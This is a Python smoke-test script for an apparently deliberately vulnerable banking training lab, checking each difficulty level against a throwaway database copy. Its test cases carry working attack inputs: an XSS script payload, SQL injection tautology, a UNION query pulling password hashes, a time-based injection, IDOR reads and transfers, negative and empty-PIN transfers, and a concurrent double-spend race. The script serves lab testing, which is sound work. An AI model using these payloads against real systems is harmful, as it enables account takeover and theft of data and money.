"""Stage 4 smoke test — transactions, transfer, history, export, detail, receipt.

Runs each lab level against a throwaway copy of the seeded database.
Not part of the lab app itself; used by the build/report step.
"""

import json
import os
import shutil
import sqlite3
import sys
import tempfile
import re
import threading
import time
import traceback

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
sys.path.insert(0, ROOT)

SRC_DB = os.path.join(ROOT, "db", "nusabank.db")

PW = "password"


def make_client(level, tmpdir):
    db_copy = os.path.join(tmpdir, f"nusabank-{level}.db")
    shutil.copyfile(SRC_DB, db_copy)
    os.environ["LAB_LEVEL"] = level
    os.environ["NUSABANK_DB"] = db_copy
    os.environ["NUSABANK_UPLOADS"] = os.path.join(tmpdir, f"uploads-{level}")
    os.environ["NUSABANK_COOKIE_SECURE"] = "0"

    from app import create_app

    app = create_app({"DB_PATH": db_copy, "UPLOAD_DIR": os.environ["NUSABANK_UPLOADS"]})
    app.config["PROPAGATE_EXCEPTIONS"] = False
    return app.test_client(), db_copy


def login(c, username, password=PW):
    return c.post("/login", data={"username": username, "password": password},
                  follow_redirects=False)


def csrf_token(client):
    """Fetch a fresh CSRF token; easy/medium render a static one."""
    body = client.get("/transfer").data.decode("utf-8", "replace")
    match = re.search(r'name="csrf_token" value="([^"]+)"', body)
    return match.group(1) if match else "nusabank-csrf-static-token"


def post_transfer(client, token, **fields):
    return client.post("/transfer", data={"csrf_token": token, **fields},
                       follow_redirects=False)


def raw(db_path, sql, params=()):
    conn = sqlite3.connect(db_path)
    conn.row_factory = sqlite3.Row
    try:
        return conn.execute(sql, params).fetchall()
    finally:
        conn.close()


def run(level):
    tmpdir = tempfile.mkdtemp(prefix=f"nusabank-{level}-")
    out = {"level": level}
    try:
        c, db_path = make_client(level, tmpdir)
        out["login_status"] = login(c, "budi01").status_code

        me = raw(db_path, "SELECT id, pin_hash FROM users WHERE username='budi01'")[0]["id"]
        my = raw(db_path, "SELECT * FROM accounts WHERE user_id=? ORDER BY id", (me,))
        out["my_accounts"] = [a["account_number"] for a in my]
        src = my[0]
        victim = raw(db_path, "SELECT * FROM accounts WHERE user_id != ? ORDER BY id", (me,))[0]
        out["victim_account"] = victim["account_number"]

        # --- history page -------------------------------------------------
        r = c.get("/transactions")
        out["history_status"] = r.status_code
        out["history_bytes"] = len(r.data)

        # --- CSV export ---------------------------------------------------
        r = c.get("/transactions/export.csv")
        out["csv_status"] = r.status_code
        out["csv_lines"] = r.data.decode("utf-8", "replace").count("\n")
        out["csv_type"] = r.headers.get("Content-Type")

        # --- IDOR: victim account history ---------------------------------
        r = c.get(f"/transactions?account_id={victim['id']}")
        out["idor_history"] = {
            "status": r.status_code,
            "leaked_victim_account": victim["account_number"].encode() in r.data,
        }

        # --- IDOR: transaction detail -------------------------------------
        vtx = raw(db_path,
                  "SELECT id, description FROM transactions WHERE account_id=? LIMIT 1",
                  (victim["id"],))[0]
        r = c.get(f"/transactions/{vtx['id']}")
        out["idor_detail"] = {
            "status": r.status_code,
            "leaked": vtx["description"].encode() in r.data
            if vtx["description"] else None,
        }
        out["idor_receipt"] = {"status": c.get(f"/transactions/{vtx['id']}/receipt").status_code}

        # --- IDOR: mini statement on dashboard ----------------------------
        victim_tx = raw(db_path,
                        "SELECT description FROM transactions WHERE account_id=? "
                        "ORDER BY created_at DESC, id DESC LIMIT 1",
                        (victim["id"],))[0]["description"]
        r = c.get(f"/dashboard?account_id={victim['id']}")
        out["idor_dashboard"] = {
            "status": r.status_code,
            "leaked": bool(victim_tx) and victim_tx.encode() in r.data,
        }

        # --- reflected XSS in the search box ------------------------------
        payload = "<script>alert(1)</script>"
        r = c.get("/transactions", query_string={"q": payload})
        out["xss_reflected"] = {"status": r.status_code,
                                "unescaped": payload.encode() in r.data}

        # --- SQLi in the keyword filter (tautology) -----------------------
        base_count = _total_count(c, {"q": "zzz-no-such-row"})
        tautology = _total_count(c, {"q": "' OR '1'='1"})
        out["sqli_keyword"] = {"baseline": base_count, "injected": tautology,
                               "changed": base_count != tautology}

        # --- SQLi UNION extraction ----------------------------------------
        union_q = ("x%' OR 1=1) UNION SELECT 1,'REF',1,1,'IN','transfer',1,'CP',"
                   "'1234567890',password_hash,'cat','success',1,"
                   "'2024-01-01 00:00:00','1000000000' FROM users -- ")
        r = c.get("/transactions", query_string={"q": union_q})
        body = r.data
        out["sqli_union"] = {
            "status": r.status_code,
            "leaked_hash": b"md5:" in body or b"$2b$" in body,
        }

        # --- SQLi in the date filter --------------------------------------
        r = c.get("/transactions", query_string={"start": "2020-01-01'"})
        out["sqli_date_broken_status"] = r.status_code

        t0 = time.time()
        r = c.get("/transactions",
                  query_string={"start": "2024-01-01' AND 1=(WITH RECURSIVE c(x) AS "
                                          "(SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<4000000) "
                                          "SELECT count(*) FROM c) AND '1'='1"})
        out["sqli_date_ms"] = int((time.time() - t0) * 1000)
        out["sqli_date_status"] = r.status_code

        token = csrf_token(c)

        # --- negative transfer --------------------------------------------
        before = raw(db_path, "SELECT balance FROM accounts WHERE id=?", (src["id"],))[0]["balance"]
        r = post_transfer(c, token, account_id=src["id"],
                          dest_account=victim["account_number"],
                          amount="-50000", description="neg", pin="123456")
        after = raw(db_path, "SELECT balance FROM accounts WHERE id=?", (src["id"],))[0]["balance"]
        out["negative_transfer"] = {"status": r.status_code, "delta": after - before}

        # --- PIN bypass: empty PIN ----------------------------------------
        before = raw(db_path, "SELECT balance FROM accounts WHERE id=?", (src["id"],))[0]["balance"]
        r = post_transfer(c, token, account_id=src["id"],
                          dest_account=victim["account_number"],
                          amount="10000", description="empty pin", pin="")
        after = raw(db_path, "SELECT balance FROM accounts WHERE id=?", (src["id"],))[0]["balance"]
        out["empty_pin_transfer"] = {"status": r.status_code, "delta": after - before}

        # --- normal transfer (correct PIN) --------------------------------
        before = raw(db_path, "SELECT balance FROM accounts WHERE id=?", (src["id"],))[0]["balance"]
        r = post_transfer(c, token, account_id=src["id"],
                          dest_account=victim["account_number"],
                          amount="7000", description="normal", pin="123456")
        after = raw(db_path, "SELECT balance FROM accounts WHERE id=?", (src["id"],))[0]["balance"]
        out["normal_transfer"] = {"status": r.status_code, "delta": after - before}

        # --- IDOR transfer: move money out of someone else's account -------
        before_v = raw(db_path, "SELECT balance FROM accounts WHERE id=?",
                       (victim["id"],))[0]["balance"]
        r = post_transfer(c, token, account_id=victim["id"],
                          dest_account=src["account_number"],
                          amount="1000", description="idor", pin="123456")
        after_v = raw(db_path, "SELECT balance FROM accounts WHERE id=?",
                      (victim["id"],))[0]["balance"]
        out["idor_transfer"] = {"status": r.status_code, "victim_delta": after_v - before_v}

        # --- method tampering: GET transfer --------------------------------
        r = c.get("/transfer/quick", query_string={
            "account_id": src["id"], "dest_account": victim["account_number"],
            "amount": "1000", "description": "get"})
        out["get_transfer"] = r.status_code

        # --- concurrent double spend ---------------------------------------
        rich = raw(db_path, "SELECT * FROM accounts WHERE user_id=? ORDER BY id", (me,))[0]
        conn = sqlite3.connect(db_path)
        conn.execute("UPDATE accounts SET balance = 100000 WHERE id = ?", (rich["id"],))
        conn.commit()
        conn.close()
        # Distinct destinations make the lost-update exploitable: every
        # thread credits its own destination, while the source debit is
        # overwritten by the last writer.
        donors = raw(db_path,
                     "SELECT id, account_number FROM accounts "
                     "WHERE id != ? AND user_id != ? ORDER BY id LIMIT 6",
                     (rich["id"], me))
        dest_before = {d["id"]: raw(db_path,
                                    "SELECT balance FROM accounts WHERE id=?",
                                    (d["id"],))[0]["balance"] for d in donors}
        statuses = []

        def fire(dest_account):
            cc = c.application.test_client()
            cc.post("/login", data={"username": "budi01", "password": PW})
            tok = csrf_token(cc)
            rr = post_transfer(cc, tok, account_id=rich["id"],
                               dest_account=dest_account,
                               amount="80000", description="race", pin="123456")
            statuses.append(rr.status_code)

        threads = [threading.Thread(target=fire, args=(d["account_number"],))
                   for d in donors]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        final = raw(db_path, "SELECT balance FROM accounts WHERE id=?",
                    (rich["id"],))[0]["balance"]
        dest_gained = sum(
            raw(db_path, "SELECT balance FROM accounts WHERE id=?", (d["id"],))[0]["balance"]
            - dest_before[d["id"]] for d in donors)
        out["race_condition"] = {
            "src_start": 100000,
            "src_final": final,
            "destinations": len(donors),
            "dest_gained_total": dest_gained,
            "statuses": sorted(statuses),
            "overdrawn": final < 0,
            "money_created": final + dest_gained - 100000,
        }

        # --- own transaction detail + receipt -----------------------------
        own_tx = raw(db_path,
                     "SELECT id FROM transactions WHERE account_id=? LIMIT 1",
                     (src["id"],))[0]["id"]
        r_detail = c.get(f"/transactions/{own_tx}")
        r_receipt = c.get(f"/transactions/{own_tx}/receipt")
        out["own_detail"] = r_detail.status_code
        out["own_receipt"] = r_receipt.status_code
        out["receipt_has_print"] = b"data-print" in r_receipt.data
        out["receipt_has_ref"] = b"TRX-" in r_receipt.data

        out["ok"] = True
    except Exception as exc:  # noqa: BLE001
        out["ok"] = False
        out["error"] = f"{type(exc).__name__}: {exc}"
        out["trace"] = traceback.format_exc()[-1500:]
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)
    return out


def _total_count(client, params):
    body = client.get("/transactions", query_string=params).data.decode("utf-8", "replace")
    marker = '<div class="card stat">\n        <strong>'
    start = body.find(marker)
    if start == -1:
        return None
    start += len(marker)
    return int(body[start:body.find("<", start)])


if __name__ == "__main__":
    levels = sys.argv[1:] or ["easy", "medium", "hard", "patched"]
    print(json.dumps([run(lv) for lv in levels], indent=1, default=str))
